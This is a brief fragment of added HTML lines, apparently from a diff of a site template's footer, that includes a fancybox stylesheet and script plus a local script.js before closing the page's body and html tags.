+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
